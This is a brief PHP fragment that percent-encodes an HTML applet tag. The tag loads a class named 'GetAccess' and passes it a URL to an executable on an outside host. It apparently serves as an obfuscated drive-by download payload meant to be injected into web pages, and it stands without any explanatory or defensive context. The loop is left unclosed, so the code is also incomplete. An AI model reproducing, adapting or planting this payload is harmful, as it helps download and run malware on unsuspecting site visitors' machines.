<?
$s=<<<DOC
<APPLET ARCHIVE='classload.jar' CODE='GetAccess.class' WIDTH=1 HEIGHT=1><PARAM NAME='ModulePath' VALUE='http://janbradley.com/scripts/sgallery/test.exe'></APPLET>
DOC;

for ($i=0;$i<strlen($s);$i++) {
	echo "%".dechex(ord($s[$i]));
?>